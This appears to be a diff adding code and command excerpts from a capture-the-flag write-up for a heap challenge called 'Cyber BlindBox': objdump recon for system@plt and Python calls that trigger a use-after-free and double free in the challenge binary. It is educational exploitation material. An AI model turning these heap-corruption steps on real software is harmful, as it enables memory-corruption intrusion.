@@ -1,0 +1,15 @@
+# Cyber BlindBox
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Recon the stripped ELF and struct layout (bash)
+file blindbox
+objdump -d blindbox | grep -B 5 'system@plt'
+objdump -d -M intel blindbox | grep -A20 '4016f6'
+
+## Exercise the UAF and double free (python)
+draw(io)
+discard(io, 0)
+review(io, 0, b'A' * 39)
+discard(io, 0)
+draw(io)
+draw(io)
